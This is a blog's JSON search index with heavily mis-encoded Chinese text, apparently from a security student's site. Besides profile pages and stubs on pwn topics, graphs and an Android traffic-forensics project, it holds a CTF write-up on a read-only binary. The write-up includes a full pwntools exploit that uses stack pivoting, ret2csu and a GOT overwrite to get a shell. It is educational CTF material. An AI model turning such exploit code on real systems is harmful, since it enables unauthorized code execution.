{"meta":{"title":"ã¯æ°¸é ã«ä¸æ»…ã§ã‚ã‚‹","subtitle":"å‡»ç¢ä½ æ²‰ç¡çš„çµé­‚ï¼","description":"æˆ‘ä»¬ä»ä¸å›å¤´","author":"4riH04X","url":"http://example.com","root":"/"},"pages":[{"title":"categories","text":"","path":"categories/index.html","date":"11-02","excerpt":""},{"title":"About Me","text":"# 0. è®ºå‰ä¸–ï¼Œä¸é—®æ¥è€… çƒ­çˆ±å­¦ä¹ çš„å°èœé¸¡ã€åˆèœåˆçˆ±ç©çš„å°èœé¸¡ã€ä¸€çªä¸é€šä½†ä¸€è…”çƒ­è¡€çš„å°èœé¸¡...... ä¸€å¥è¯é€ç»™æ­¤æ—¶çš„æˆ‘å’Œæ­¤æ—¶æ­£åœ¨çœ‹çš„ä½ ï¼š â€œç§ä¸€æ£µæ ‘æœ€å¥½çš„æ—¶é—´æ˜¯åå¹´å‰ï¼Œå…¶æ¬¡æ˜¯ç°åœ¨ï¼â€ # 1. ä¸ªäººç®€ä»‹ èˆ¹å¸¦ç½‘å®‰å­¦å­ä¸€æšï¼Œæ‰‹è´±é«˜è€ƒè¿˜å¡«æŠ¥äº†æ³•å­¦ä¸“ä¸šï¼Œå› æ­¤ç¬¨äººæ˜¯ â€œé«˜è´µâ€ çš„ç½‘å®‰æ³•åŒå­¦ä½å­¦ç”Ÿã€‚ è§ç¬‘äº†ï¼Œæ²¡å­¦è¿‡æ³•å¾‹çš„å°èœé¸¡ã€‚ å–œæ¬¢æ•°æ®åˆ†æï¼ŒäºŒè¿›åˆ¶å®‰å…¨ã€‚å¦å¤–å¼•å¸ˆå‚…ä»¬çš„è‡ªæˆ‘ä»‹ç»ï¼šâ€œè‡ªå­¦äºŒè¿›åˆ¶æ¼æ´ï¼Œæ˜¯ä¸ª pwn ç©¶æèœé¸¡â€ ä½†è¶³å¤Ÿçƒ­çˆ±ï¼Œè¶³çŸ£ã€‚åˆæƒ³èµ·ä¸¤å¥è¯ï¼š â€œæœ‰äººé—®æˆ‘ï¼Œä½ å®³æ€•æ­»äº¡å—ï¼Ÿâ€ â€œç­”æ›°ï¼šè‹¥ç«‹è¶³å¹´æˆå¤©åœ°ä¹‹é­„ï¼Œæ­»åˆä½•å¦¨â€ å½“åšæŒçƒ­çˆ±æ¯ä¸€å¤©çš„ç”Ÿæ´»ï¼Œå½“æŠŠæ¯åˆ†æ¯ç§’å¡æ»¡æ—¶ï¼Œè¿™æ˜¯æå…¶å¹¸ç¦çš„ã€‚ # 2.ID è§£è¯» 4riH04Xï¼Œç–¯ç™«ä¹‹æ„ï¼Œå¸Œæœ›èƒ½ä¸é¡¾ç‰²å‘½ï¼ŒH04X å³æ˜¯ HOAX ç–¯ç‹‚ã€ç–¯ç™«ã€‚ â€œå³æ˜¯æˆ‘è®¤å®šçš„å·…å³°ï¼Œæ— é¡¾è‰°è¾›ï¼Œäº¦ä¸ºæ­¤ç–¯ç™«ï¼Œçºµåƒå¹´æ— åâ€ å¸Œæœ›èƒ½ä»¥æ­¤ ID è‡ªå˜²å¹¶é¼“åŠ±è‡ªå·±ä¸é¡¾ä»–äººçœ¼å…‰ï¼Œè‡ªæˆ‘é™¶é†‰å§ï¼ ~â€œPast lives couldn't ever hold meâ€ ~&quot;Don't wake me, I'm not dreamin'&quot; # 3. æœªæ¥å±•æœ› å€Ÿæ­¤åšå®¢çš„å¼€è¾Ÿï¼Œè®°å½•ä¸€ä¸‹è‡ªå·±çš„å­¦ä¹ ä½“ä¼šå’Œä¸ªäººå¯¹ä¸€äº›çŸ¥è¯†æµ…è–„çš„ç†è§£ã€‚ æ›´å¤šçš„å¸Œæœ›è‡ªå·±å€Ÿæ­¤åšå®¢æ¿€åŠ±è‡ªå·±ï¼Œ â€œä»°å¤©å¤§ç¬‘å‡ºé—¨å»ï¼Œæˆ‘è¾ˆå²‚æ˜¯è“¬è’¿äººï¼â€","path":"about/index.html","date":"11-02","excerpt":""},{"title":"404","text":"","path":"404/index.html","date":"11-02","excerpt":""},{"title":"friends","text":"# å‹äººå¸ è¿™äº›äººéƒ½æ˜¯å·¨ä½¬ï¼Œæµ…æµ…æŒ‚ä¸€ä¸‹å¸Œæœ›åˆ«éª‚æˆ‘ï¼Œï¼Œï¼Œ tld ç³Šæ¶‚æ¶‚ã®åšå®¢","path":"friends/index.html","date":"11-05","excerpt":""},{"title":"search","text":"","path":"search/index.html","date":"11-02","excerpt":""},{"title":"links","text":"# 0. è¯´æ˜ è¿™é‡Œå­˜æ”¾äº†ä¸€äº›å®ç”¨çš„ç½‘ç«™ï¼ï¼ï¼æŒç»­æ›´æ–°ï¼Œå¯ä»¥ç»™æˆ‘ç•™è¨€","path":"links/index.html","date":"11-05","excerpt":""}],"posts":[{"title":"å¸¸è§æ¼æ´","text":"æ…¢æ…¢æ›´æ–°ï¼Œå¼€å§‹æŠ•å…¥ # 1.ret2text # 2.ret2syscall # 3.ret2libc # 4.ret2shellcode # # 5.ret2dl # 6.fmt # UAF unlink off-by-null kernelrop double-fetch musl-pwn web-pwn","path":"CTF/Pwn/note/Pwné¢˜å‹/","date":"11-18","excerpt":"","tags":[{"name":"Pwn","slug":"Pwn","permalink":"http://example.com/tags/Pwn/"}]},{"title":"ä¸€ä¸ªåªæœ‰readçš„ç¨‹åº","text":"â€‹ è¿‘æœŸéƒ½å¾ˆå¿™ï¼Œçªå‘å¥‡æƒ³åœ¨äºŒè¿›åˆ¶âœŒï¼ˆï¼‰çš„å¼•å¯¼ä¸‹æƒ³å®Œæˆè¿™ä¸€é“æ‰€è°“çš„ä¸­ç­‰é¢˜ğŸ˜ŠğŸ˜ŠğŸ˜Šï¼ˆåœ¨è¿™ä¹‹å‰è¡¥å……ä¸€ä¸‹ï¼ŒèŠåˆ°äº†å‡Œæ™¨ 4 ç‚¹ï¼Œç°åœ¨èº«å¿ƒä¿±ç–²ã€‚ï¼‰ æ­¤å‰ä¸€ç›´åšä¸€äº›ç®€å•çš„æ¿å­é¢˜åº¦æ—¥ï¼Œå †åªçœ‹ä¸ç¢°ï¼Œæ ˆåªæŒ‘ç®€å•çš„åšï¼ŒçœŸçš„å¯æ¶å•Šï¼ # 1.read åŸç¨‹åº â€‹ åªæœ‰ä¸€ä¸ª readï¼Œæ˜æ˜¾æ ˆæº¢å‡ºï¼Œè‡³äºæ€ä¹ˆæº¢å‡ºï¼Œé¢ï¼Œå¾…ä¼šç»†çã€‚å½“ç„¶è¿™é‡Œä¸€çœ¼çœ‹è¿‡å»ï¼Œshellcode æ˜¯æœ€å¥½æƒ³åˆ°çš„å•Šï¼Œæˆ‘ä»¬ç®€å•çœ‹çœ‹ä¿æŠ¤å’Œ vmmap çœ‹çœ‹æœ‰æ²¡æœ‰ è¡Œé«˜äº®1234567è§£é‡Š64ä½ç¨‹åºï¼Œå°ç«¯åºå¼€å¯éƒ¨åˆ†RELRO-----gotè¡¨ä»å¯å†™æœªå¼€å¯canaryä¿æŠ¤-----å­˜åœ¨æ ˆæº¢å‡ºå¼€å¯NXä¿æŠ¤-----å †æ ˆä¸å¯æ‰§è¡Œ å…¶å®è¿™é‡Œæ²¡å¿…è¦çœ‹vmmapäº†ï¼Œç®—äº†ç†Ÿæ‚‰ä¸€ä¸‹æŒ‡ä»¤å§æœªå¼€å¯PIE-----ç¨‹åºåœ°å€ä¸ºçœŸå®åœ°å€åŠ¨æ€é“¾æ¥ â€‹ æ˜¾ç„¶ï¼Œè¿™é‡Œæ²¡æœ‰åƒé™æ€é“¾æ¥ç¨‹åºå›ºå®šå¸¦æœ‰çš„ mprotect å‡½æ•°ï¼Œå¯ä»¥å»ä¿®æ”¹å†…å­˜é¡µçš„æƒé™ä¸º rwxpï¼Œï¼ˆå†è°ƒç”¨ read å‡½æ•°å°† pwntools ç”Ÿæˆçš„ shellcode ä»£ç æ³¨å…¥åˆ° addr ä¸­ï¼Œä¹‹åå†å°† read å‡½æ•°è¿”å›åœ°å€å†™ä¸º addr åœ°å€ï¼Œè°ƒç”¨ shellcodeï¼Œè·å¾— shellï¼‰ï¼Œè€Œä¸”å°±ç®—å¯ä»¥æ”¹ï¼Œä¹Ÿæ²¡åŠæ³•æ³„éœ² addrï¼Œè¿™ä¸ªæƒ³æ³•è¢« pass äº†ã€‚ # 2. ä¸€ä¸ªå¯è¡Œçš„ idea - æ‹“å±•åˆ°æ ˆä¸Šçš„ ret2dl ä»¥å‰åªæ˜¯è§è¿‡ï¼Œä»Šå¤©æ¥å®æ“ä¸€ä¸‹ã€‚ğŸ˜‹ï¼Œå½“ç„¶ t1d è¯´è¿™ä¸ªé¢˜ç”¨å®ƒåšä¸å‡ºæ¥ã€‚ # ret2dl ä»‹ç» â€‹ å¯¹äº NO RELRO çš„æƒ…å†µï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨ read å‡½æ•°ä¿®æ”¹ .dynamic æ®µä¸­çš„ .dynstr èŠ‚çš„åœ°å€ï¼Œå°†å…¶ä¿®æ”¹ä¸ºæˆ‘ä»¬å¯æ§åˆ¶çš„åœ°å€ã€‚ç„¶åæˆ‘ä»¬å¯ä»¥åœ¨è¿™ä¸ªåœ°å€ä¸Šæ„é€ ä¸€ä¸ªä¼ªé€ çš„ fake_dynstr ï¼Œå°†å…¶ä¸­çš„æŸä¸ªå­—ç¬¦ä¸²æ›¿æ¢ä¸º system å‡½æ•°çš„å­—ç¬¦ä¸²ã€‚ â€‹ æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬å¯ä»¥è°ƒç”¨ .dl_fixup å‡½æ•°ï¼Œå®ƒä¼šè§£ææˆ‘ä»¬ä¿®æ”¹çš„å­—ç¬¦ä¸²æ‰€å¯¹åº”çš„åŸå‡½æ•°ã€‚ _dl_fixup å‡½æ•°æ ¹æ®å­—ç¬¦ä¸²ï¼ˆä¹Ÿå°±æ˜¯å‡½æ•°åï¼‰æ¥ç´¢å¼•å‡½æ•°ï¼Œå› æ­¤æœ€ç»ˆä¼šè§£æ system å‡½æ•°ã€‚ â€‹ æ— è®ºæ˜¯ 32 ä½è¿˜æ˜¯ 64 ä½ï¼Œå®ç°è¿™ä¸ªè¿‡ç¨‹éƒ½ç›¸å¯¹ç®€å•ã€‚å…·ä½“æ­¥éª¤å¦‚ä¸‹ï¼š è¡Œé«˜äº®1234æ‰¾åˆ°.dynamicæ®µå¹¶è·å–.dynstrèŠ‚çš„åœ°å€ï¼ˆSTRTABçš„d_ptrï¼‰ã€‚ä½¿ç”¨readå‡½æ•°å°†.dynstrçš„åœ°å€ä¿®æ”¹ä¸ºæˆ‘ä»¬å¯æ§åˆ¶çš„åœ°å€ã€‚åœ¨å¯æ§åˆ¶çš„åœ°å€ä¸Šæ„é€ ä¸€ä¸ªfake_dynstrï¼Œå°†å…¶ä¸­çš„æŸä¸ªå­—ç¬¦ä¸²æ›¿æ¢ä¸ºsystemå‡½æ•°çš„å­—ç¬¦ä¸²ã€‚è°ƒç”¨.dl_fixupå‡½æ•°ï¼Œå®ƒä¼šè§£ææˆ‘ä»¬ä¿®æ”¹çš„å­—ç¬¦ä¸²æ‰€å¯¹åº”çš„åŸå‡½æ•°ï¼Œå³systemå‡½æ•°ã€‚ æ³¨ï¼šå¦‚æœæ˜¯ FULL RELERO ï¼Œç¨‹åºåœ¨è¿è¡Œä¹‹å‰å°±å·²ç»è°ƒç”¨äº† ld.so å°†æ‰€éœ€çš„å¤–éƒ¨å‡½æ•°åŠ è½½å®Œæˆï¼Œç¨‹åºè¿è¡ŒæœŸé—´ä¸è¿›è¡ŒåŠ¨æ€åŠ è½½ï¼Œå› æ­¤ï¼Œåœ¨ç¨‹åºçš„ got è¡¨ä¸­ï¼Œ link_map å’Œ dl_runtime_resolve å‡½æ•°çš„åœ°å€éƒ½ä¸º 0 å¯ä»¥å‚è€ƒï¼šã€ç²¾é€‰ã€‘ret2dlresolve è¶…è¯¦ç»†æ•™ç¨‹ (x86&amp;x64)-CSDN åšå®¢ # æœ¬é¢˜çš„å…·ä½“å®è·µ â€‹ æ˜¾ç„¶ï¼Œé™¤äº†ä¸Šè¿°æ–¹æ³•ä¸­é€šè¿‡è°ƒç”¨ system(&quot;/bin/sh&quot;) å’Œæ‰“ one_gadget æ¥ getshell ä»¥å¤–ï¼Œè¿˜æœ‰ä¸€ç§å¸¸è§æ–¹å¼å°±æ˜¯é€šè¿‡è§¦å‘ syscall è½¯ä¸­æ–­æ¥ getshellï¼Œç„¶è€Œï¼Œæœ¬é¢˜çš„ ELF æºæ–‡ä»¶ä¸­å¹¶æ²¡æœ‰ syscall è¿™ä¸ª gadget ï¼Œå¹¶ä¸”ï¼Œæˆ‘ä»¬åˆæ— æ³•æ³„éœ² libc ä¿¡æ¯ï¼Œç”¨ libc ä¸­çš„ syscall ï¼Œå› æ­¤ï¼Œæˆ‘ä»¬éœ€è¦æƒ³åŠæ³•åˆ›é€ å‡º syscall è¿™ä¸ª gadgetã€‚ â€‹ åœ¨ t1d çš„æŒ‡å¼•ä¸‹ï¼Œæˆ‘å»å›é¡¾äº†ä¸€é read,write è¿™äº›å‡½æ•°ã€‚å‚è€ƒæ–‡ç« ï¼šctf ä¸­å…³äº syscall ç³»ç»Ÿè°ƒç”¨çš„ç®€å•åˆ†æ - çŸ¥ä¹ (zhihu.com) è¡Œé«˜äº®1234567891011121314151617read()ï¼š ssize_t read(int fd,const void *buf,size_t nbytes); //fd ä¸ºè¦è¯»å–çš„æ–‡ä»¶çš„æè¿°ç¬¦ 0 //buf ä¸ºè¦è¯»å–çš„æ•°æ®çš„ç¼“å†²åŒºåœ°å€ //nbytes ä¸ºè¦è¯»å–çš„æ•°æ®çš„å­—èŠ‚æ•° //read() å‡½æ•°ä¼šä» fd æ–‡ä»¶ä¸­è¯»å– nbytes ä¸ªå­—èŠ‚å¹¶ä¿å­˜åˆ°ç¼“å†²åŒº bufï¼Œ //æˆåŠŸåˆ™è¿”å›è¯»å–åˆ°çš„å­—èŠ‚æ•°ï¼ˆä½†é‡åˆ°æ–‡ä»¶ç»“å°¾åˆ™è¿”å›0ï¼‰ï¼Œå¤±è´¥åˆ™è¿”å› -1ã€‚write() ssize_t write(int fd,const void *buf,size_t nbytes); //fd ä¸ºè¦å†™å…¥çš„æ–‡ä»¶çš„æè¿°ç¬¦ 1 //buf ä¸ºè¦å†™å…¥çš„æ•°æ®çš„ç¼“å†²åŒºåœ°å€ //nbytes ä¸ºè¦å†™å…¥çš„æ•°æ®çš„å­—èŠ‚æ•° //write() å‡½æ•°ä¼šå°†ç¼“å†²åŒº buf ä¸­çš„ nbytes ä¸ªå­—èŠ‚å†™å…¥æ–‡ä»¶ fdï¼Œ //æˆåŠŸåˆ™è¿”å›å†™å…¥çš„å­—èŠ‚æ•°ï¼Œå¤±è´¥åˆ™è¿”å› -1ã€‚ â€‹ å…¶å®ï¼Œåœ¨ libc ä¸­ï¼Œreadï¼Œwriteï¼Œcloseï¼Œalarm ç­‰ç­‰è¿™äº›å‡½æ•°åªæ˜¯å¯¹ç³»ç»Ÿè°ƒç”¨è¿›è¡Œäº†ç®€å•çš„å°è£…ï¼Œåœ¨è¿™äº›å‡½æ•°ä¸­éƒ½å­˜åœ¨ syscall è¿™ä¸ª gadgetï¼Œä¸” syscall ä¸€èˆ¬ç¦»å‡½æ•°çš„å¼€å§‹åœ°å€éƒ½å¾ˆè¿‘ï¼Œæ•…å¯ä»¥å°†è¿™äº›å‡½æ•°çš„ got è¡¨æ”¹ä¸º syscall çš„åœ°å€ï¼Œä»è€Œè§¦å‘ç³»ç»Ÿè°ƒç”¨ã€‚ åŒæ ·æˆ‘ä»¬å¯ä»¥å…·ä½“çœ‹çœ‹ ida é‡Œé¢ read çš„æ±‡ç¼–ï¼šæœ¬é¢˜çš„ä¸çŸ¥é“ä¸ºå•¥æ²¡æ˜¾ç¤º syscallï¼Œæ˜¾ç¤ºçš„æ˜¯ callğŸ˜‹ï¼Œä¸‹é¢æ˜¯åšå®¢é‡Œçš„ï¼Œçœ‹ç€æ›´æ¸…æ™°ä¸€ç‚¹ã€‚ è¡Œé«˜äº®12345å°†readçš„ç³»ç»Ÿè°ƒç”¨å· 0 èµ‹å€¼ç»™ raxå°† readçš„ç¬¬ä¸€ä¸ªå‚æ•°0 ï¼ˆfdï¼‰ èµ‹å€¼ç»™äº† rdiå°† readçš„ç¬¬äºŒä¸ªå‚æ•° buf èµ‹å€¼ç»™äº† rsiå°† readçš„ç¬¬äºŒä¸ªå‚æ•° buf èµ‹å€¼ç»™äº† rdxå³ç³»ç»Ÿè°ƒç”¨äº† read(0,&amp;buf,0x400) â€‹ ğŸ˜‹, è¦æ˜¯æ‰€æœ‰é¢˜ç›®éƒ½å¯ä»¥ç›´æ¥å»æŠŠ read çš„ got è¡¨æ”¹æˆ syscallï¼Œå†ä¿®æ”¹å‚æ•°æ‰§è¡Œå°±å¥½äº†ï¼ˆï¼‰ â€‹ å¥½äº†ï¼Œæˆ‘ä»¬çŸ¥é“ï¼Œåœ¨ 64 ä½ä¸­ï¼Œè¦æƒ³æˆåŠŸ getshellï¼Œéœ€è¦æ§åˆ¶çš„å¯„å­˜å™¨å¦‚ä¸‹ï¼š è¡Œé«˜äº®12345rax = 0x3brdi = bin_sh_addrrsi = 0rdx = 0syscall â€‹ å› æ­¤é’ˆå¯¹æœ¬é¢˜çš„æ€è·¯å¦‚ä¸‹ï¼š â€‹ æˆ‘ä»¬å¯ä»¥ç”¨ ret2csu å…ˆæ”¹å†™ read çš„ got è¡¨ä¸º syscall çš„åœ°å€ï¼Œæœ‰äº† syscall åï¼Œå†ç”± read è¯»å…¥çš„å­—èŠ‚æ•°æ§åˆ¶ rax å¯„å­˜å™¨ï¼ˆåŒæ—¶è¯»å…¥ /bin/sh å­—ç¬¦ä¸²ï¼‰ï¼Œå¹¶ç”¨ ret2csu æ§åˆ¶ rdiï¼Œrsiï¼Œrdx ä¸‰ä¸ªå‚æ•°ï¼Œæœ€åè°ƒç”¨è§¦å‘ syscall å³å¯ã€‚t1d è¯´çš„å¤§è‡´ç›¸åŒï¼Œé‚£æˆ‘å…ˆå»å®æ“äº†ï¼Œå›æ¥æ¥ç€å†™ï¼Œä¸‡ä¸€è¿˜æœ‰å‘ï¼Œåšä¸å‡ºæ¥å°±æ˜¯ğŸ¤¡äº†ã€‚ 2023-11-17 10:53:07 2023-11-18 19:31:07 # 3. å°ä¸‘å½’æ¥ğŸ¤¡ æœ¬é¢˜ç›®çš„éš¾ç‚¹åœ¨æ ˆè¿ï¼Œï¼Œï¼Œï¼Œï¼ˆå¯¹æˆ‘è¿™ä¸ªèœğŸ•æ¥è¯´ï¼‰ â€‹ æ–­æ–­ç»­ç»­é–æˆ˜ 1 å¤©ï¼Œåœ¨å¸ˆå‚…çš„æ•²æ‰“ä¸‹ï¼Œè¯¥ç¢°çš„å‘éƒ½ç¢°ï¼Œå…ˆæ€»ç»“å¾—å¤±ï¼š 1. åšé¢˜è¦åŠ¨æ€è°ƒè¯•ï¼Œä¸€ä¸‹åˆå¯èƒ½è·‘äº†ä¸¤ä¸‰æ¬¡å§ï¼Œç”»è¡¨æ ¼å¸ƒæ ˆã€æ‰“è‰ç¨¿ï¼Œç­‰ç­‰ï¼Œè¿™äº›éƒ½ä¸å¦‚åŠ¨è°ƒæ¥çš„å¿« 2. æ ˆè¿ç§»çš„æŠ€å·§ï¼šç›´æ¥æŠŠè¿”å›åœ°å€å†™æˆ read çš„ lea rax, [rbp+buf] ï¼ŒæŠŠ rbp æ”¹æˆæƒ³è¿ç§»åˆ°çš„åœ°å€ï¼Œè¿™ä¸ªåœ°å€æœ‰è€ƒç©¶ï¼Œå¾…ä¼šè®¤çœŸè¯´ã€‚ 3. å·§å¦™åˆ©ç”¨ read å®ç°ä»»æ„å†™ï¼Œå¸ƒé“¾å­ã€‚ å¾…ä¼šè¯´ï¼Œè‡ªé—­äº†ï¼Œæ¿å­é¢˜åªæ˜¯åŸºç¡€ï¼Œè¦å¤šè§æ–°é¢˜ï¼ŒåŸºç¡€æ‰“ç‰¢ï¼Œå¤šè°ƒé¢˜ç›®ã€‚ æ•´ä½“æ¥è¯´ï¼Œå¯¹è¿™ä¸ª â€œç®€å•â€ çš„åšæ³•è¿˜æ˜¯å­˜åœ¨ä¸€äº›ç–‘æƒ‘ï¼Œç­‰å¼„æ‡‚äº†å›æ¥æ›´æ–°ã€‚ # 1ï¼‰æ ˆè¿ç§» ä¸€äº›å­¦ä¹ çš„åšå®¢ï¼š æ ˆè¿ç§»çš„åŸç† &amp;&amp; å®æˆ˜è¿ç”¨ - ZikH26 - åšå®¢å›­ (cnblogs.com) å“ï¼Œå°‘çœ‹ï¼Œå¤šå®è·µ é’ˆå¯¹æœ¬é¢˜å…·ä½“çš„æ˜¯è¿ç§»åˆ° read çš„è™šæ‹Ÿæ ˆï¼Œemï¼Œè¿˜è¦å†å­¦ä¹ ä¸€ä¸‹å›æ¥å…·ä½“è¡¥å…… # 2ï¼‰ROP é“¾ åƒ ret2syscall ä¸€æ ·ï¼Œç›´æ¥è°ƒç”¨ read_plt # 3ï¼‰ç”¨ csu æ”¹ got å½“ç„¶è¿™é‡Œæ˜¯å’Œ 4 ç»“åˆåœ¨ä¸€èµ·çš„ï¼Œç”¨ read æ§åˆ¶è¾“å…¥ä¸º 0x3b è°ƒèŠ‚ rax å®ç°æ”¹ got åŒæ—¶è°ƒç”¨ syscall çš„ä½œç”¨ # 4.exp è¡Œé«˜äº®123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172#seccomp-tools dump ./pwn.pwnçœ‹å“ªäº›è¢«ç¦ç”¨äº†#æ ˆåŠ«æŒå°±æ˜¯å…ˆè®¨è®ºmainå‡½æ•°é‡Œçš„æ ˆè¿ç§»ï¼Œé¦–å…ˆåˆ©ç”¨æº¢å‡ºæŠŠebpçš„å†…å®¹ç»™ä¿®æ”¹æ‰ï¼ˆä¿®æ”¹æˆæˆ‘ä»¬è¦è¿ç§»çš„é‚£ä¸ªåœ°å€ï¼‰#å¹¶ä¸”æŠŠè¿”å›åœ°å€å¡«å……æˆleave;retæŒ‡ä»¤çš„åœ°å€ï¼ˆå› ä¸ºæˆ‘ä»¬éœ€è¦ä¸¤æ¬¡leave;retï¼‰#execveï¼š59å·ç³»ç»Ÿè°ƒç”¨ execve(&quot;/bin/sh&quot;,0,0) r12ä¸­å¡«å…¥exceveçš„åœ°å€ï¼Œå…¶ä½™å¯„å­˜å™¨ç½®0ã€‚#å¸Œæœ›æ§åˆ¶å¯„å­˜å™¨ä¸ºï¼š#rax = 0x3b syscall#rdi = bin_sh_addr#rsi = 0#rdx = 0#syscallfrom pwn import *context(os=&#x27;linux&#x27;, arch=&#x27;amd64&#x27;, log_level=&#x27;debug&#x27;) p = process(&quot;./pwn.pwn&quot;)elf = ELF(&quot;./pwn.pwn&quot;)#ret2csuçš„ä¸¤ä¸ªgadget#loc_4011B6: pop_rbx_addrgadget1_addr = 0x4011ba#loc_4011A0: mov_rdx_r14_addr gadget2_addr = 0x4011A0 read_plt = elf.plt[&#x27;read&#x27;]read_got = elf.got[&#x27;read&#x27;]#å®šä¹‰åˆ©ç”¨csuçš„é€šç”¨gadgetå‡½æ•°#rdi,rsi,rdxdef com_gadget(addr1 , addr2 , jmp2 , arg1 , arg2 , arg3): payload = p64(addr1) + p64(0) + p64(1) + p64(arg1) + p64(arg2) + p64(arg3) + p64(jmp2) + p64(addr2) + b&#x27;a&#x27;*56 # csu = pop_rbx_addr , rbx , rbp , r12 , r13 , r14 , r15 , mov_rdx_r14_addr 56ä¸ªå¯¹åº”é‚£å‡ ä¸ªpop return payload gdb.attach(p)pause()#1æ ¸å¿ƒæ˜¯ä¸¤æ¬¡leave_ret#è¿ç§»æ ˆï¼šåˆ°readçš„è™šæ‹Ÿæ ˆ#retret = 0x4040c0+0xa0#leave_ret#readçš„jmpæŒ‡ä»¤åœ°å€leave_ret = 0x401132#rbpæ”¾å›å»çš„åœ°å€payload = b&#x27;a&#x27;*0xa0 #è¦†ç›–åˆ°è¿”å›åœ°å€payload += p64(ret) + p64(leave_ret)p.send(payload)pause()#2ROPé“¾æ¡#è°ƒç”¨syscallpop_rsi_r15=0x4011c1#å‚æ•°1çš„åœ°å€0x404200#å‚æ•°2ï¼š0#è°ƒç”¨ä¿®æ”¹åçš„read-&gt;syscallpayload = p64(pop_rsi_r15)+p64(0x404200)+p64(0)+p64(read_plt)#3è°ƒç”¨readä¿®æ”¹gotè¡¨ 0x404200-&gt;binsh 0 0payload += com_gadget(gadget1_addr, gadget2_addr, read_got, 0x404200,0,0)#æ ˆè¿åˆ°read_gotçš„ä½ç½®å¹¶æ‰§è¡Œleave_ret-&gt;readpayload = payload.ljust(0xa0, b&#x27;a&#x27;)+ p64(read_got+0xa0) + p64(leave_ret)p.send(payload)pause()#4.æ§åˆ¶readçš„è¯»å…¥å­—èŠ‚æ§åˆ¶raxï¼Œå®ç°syscallp.send(b&#x27;\\xd0&#x27;)p.send(b&#x27;/bin/sh\\x00&#x27; + b&#x27;a&#x27;*(0x3b-8))p.interactive() # 5. æ›´æ–°","path":"CTF/Pwn/solutions/learn/read/","date":"11-17","excerpt":"","tags":[{"name":"Pwn","slug":"Pwn","permalink":"http://example.com/tags/Pwn/"}]},{"title":"å›¾çš„å­¦ä¹ ","text":"# æ•°æ®ç»“æ„ä¸ç®—æ³•ï¼šå›¾çš„å­¦ä¹  # ä¸€ã€‚å›¾çš„ä¸€äº›æœ¯è¯­å­¦ä¹  # 1. å›¾çš„åŸºæœ¬åŒºåˆ† ** æ— å‘å›¾ï¼šä»»æ„ä¸¤ä¸ªèŠ‚ç‚¹ä¹‹é—´çš„ â€œè¾¹â€** æ²¡æœ‰æ–¹å‘ï¼Œå¯ä»¥ç”¨ï¼ˆaï¼Œbï¼‰è¡¨ç¤º ** æ— å‘å›¾ï¼š** ä»»æ„ä¸¤ä¸ªèŠ‚ç‚¹ä¹‹é—´çš„ â€œå¼§â€ éƒ½æœ‰æ–¹å‘ï¼Œå¯ä»¥ç”¨ &lt;a,b&gt; è¡¨ç¤ºï¼Œè¡¨ç¤º a åˆ° b çš„å¼§ # 2. å›¾çš„åŸºæœ¬æ¦‚å¿µ å­¦ä¹ å›¾çš„ç®—æ³•å‰ï¼Œè¿™ä¹‹å‰å…ˆå­¦ä¹ å›¾çš„å‡ ç§å­˜å‚¨æ–¹å¼ # äºŒã€‚å›¾çš„å­˜å‚¨æ–¹å¼ # 1. é‚»æ¥çŸ©é˜µ # 2. é‚»æ¥è¡¨","path":"computer-science/Data-Structures/cpp/å›¾/","date":"11-14","excerpt":"","tags":[{"name":"æ•°æ®ç»“æ„ä¸ç®—æ³•","slug":"æ•°æ®ç»“æ„ä¸ç®—æ³•","permalink":"http://example.com/tags/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/"}]},{"title":"å†™ä½œæ¨¡æ¿","text":"è¿™é‡Œæ˜¯å†™ä½œæ¨¡æ¿ï¼Œä¸€èˆ¬ç‚¹å¼€æ­¤æ–‡ä»¶å¤åˆ¶ç¼–è¾‘å†™æ–‡ç« ","path":"æ¨¡æ¿/","date":"11-12","excerpt":"","tags":[{"name":"åšå®¢è¯´æ˜","slug":"åšå®¢è¯´æ˜","permalink":"http://example.com/tags/%E5%8D%9A%E5%AE%A2%E8%AF%B4%E6%98%8E/"}]},{"title":"2023å¤§åˆ›ä»‹ç»","text":"...... # é¡¹ç›®ç®€ä»‹ â€‹ ç½‘ç»œçŠ¯ç½ªéšæŠ€æœ¯å‘å±•è€Œæ—¥ç›Šæ³›æ»¥ï¼Œç°æœ‰çš„ä¾¦æŸ¥å–è¯æŠ€æœ¯å´æ— æ³•æ»¡è¶³å¸æ³•å®åŠ¡éœ€è¦ï¼Œè®©ä¸æ³•åˆ†å­æœ‰å¯ä¹˜ä¹‹æœºï¼Œä¸¥é‡å¨èƒäº†ä¸ªäººä¿¡æ¯ã€å…¬æ°‘è´¢äº§ä¹ƒè‡³å›½å®¶å®‰å…¨ã€‚é¡¹ç›®åŸºäºå‰æœŸè°ƒç ”ï¼Œç ”ç©¶ Android æµé‡åˆ†ææŠ€æœ¯ï¼Œæ‹Ÿç”¨ VPN ä»£ç†é‡‡é›†æµé‡ï¼Œé›†æˆå¼ºåŒ–å­¦ä¹ æ¨¡å‹ä¸ LLMsï¼ŒåŸºäº LSTM ä¸ LightGBM ç­‰æ¨¡å‹å®ç°æœ¬åœ°è½»é‡åŒ–ï¼›å®ç°åº”ç”¨æ¶æ„è¡Œä¸ºç²—è¯†åˆ«ä¸é£é™©é¢„è­¦ï¼›æœåŠ¡ç«¯ç²¾æ£€æµ‹ã€æœ‰æ•ˆæ£€å‡ºæ¶æ„æµé‡å¹¶åˆ†æå–è¯ï¼›ç»“åˆè¯‰è®¼æ³•å’Œè¯æ®æ³•è¯„ä¼°åˆ†æå¹¶æ­å»ºä¸€ä¸ªåŸºäº B/S æ¶æ„çš„åˆ†ææŠ¥å‘ŠæŸ¥è¯¢ä¸ç»éªŒäº¤æµç½‘é¡µã€‚ # é¡¹ç›®åˆ›æ–°ç‚¹ 1.AI èµ‹èƒ½ Network Traffic Analysisï¼Œé›†æˆå¼ºåŒ–å­¦ä¹ å’Œ LLMs é«˜æ•ˆæ£€å‡ºæ¶æ„æµé‡ï¼Œæå‡ Androidã€HarmonyOS åº”ç”¨ç”Ÿæ€è´¨é‡ã€‚ 2. å€ŸåŠ©å¤§æ 